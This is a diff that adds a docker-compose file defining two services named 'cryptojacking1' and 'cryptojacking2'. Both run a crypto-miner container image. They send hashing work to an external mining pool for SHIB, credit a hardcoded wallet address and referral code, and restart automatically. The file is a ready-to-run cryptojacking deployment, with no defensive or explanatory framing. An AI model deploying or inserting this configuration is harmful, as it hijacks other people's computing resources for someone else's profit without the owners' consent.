@@ -1,0 +1,29 @@
+version: "3.3"
+services:
+        cryptojacking1:
+                image: ghcr.io/lpsm-dev/docker-crypto-miner:main
+                ports:
+                        - "8101:8101"
+                environment: 
+                        - MINING_POOL=rx.unmineable.com:3333
+                        - MINING_COIN=SHIB
+                        - REFERRAL_CODE=7lkr-kmhq
+                        - WALLET_ADDRESS=0x989fbe40a7c62bd7f1d78266fbe23dcc8e3220be
+                        - WORKER_NAME=docker-mining
+                restart: unless-stopped          
+                stdin_open: true
+                tty: true
+        cryptojacking2:
+                image: ghcr.io/lpsm-dev/docker-crypto-miner:main
+                ports:
+                        - "8102:8102"
+                environment:
+                        - MINING_POOL=rx.unmineable.com:3333
+                        - MINING_COIN=SHIB
+                        - REFERRAL_CODE=7lkr-kmhq
+                        - WALLET_ADDRESS=0x989fbe40a7c62bd7f1d78266fbe23dcc8e3220be
+                        - WORKER_NAME=docker-mining
+                restart: unless-stopped
+                stdin_open: true
+                tty: true
+
